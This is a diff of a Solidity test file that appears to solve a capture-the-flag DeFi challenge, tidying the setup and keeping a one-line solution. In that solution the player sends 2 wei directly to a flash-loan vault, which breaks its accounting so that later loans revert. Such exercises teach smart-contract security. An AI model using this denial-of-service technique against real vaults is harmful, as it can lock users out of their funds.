@@ -62,28 +62,22 @@ contract TestUnstoppable is Test {
 
         vm.stopPrank();
 
-        vm.startPrank(someUser);
 
         // Show it's possible for someUser to take out a flash loan
+        vm.startPrank(someUser);
         receiverContract = new ReceiverUnstoppable(address(vault));
         receiverContract.executeFlashLoan(100 ether);
-
         vm.stopPrank();
+
     }
 
     function testUnstoppable() public {
         /** CODE YOUR SOLUTION HERE */
-
-        // vm.startPrank(someUser);
-        
-        receiverContract.executeFlashLoan(100 ether);
-        // vm.stopPrank();
         // Sending 2 Wei to the Vault, although even 1 Wei is enough
         vm.prank(player);
         token.transfer(address(vault), 2);
 
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
         // It is no longer possible to execute flash loans
         vm.startPrank(someUser);
         vm.expectRevert();
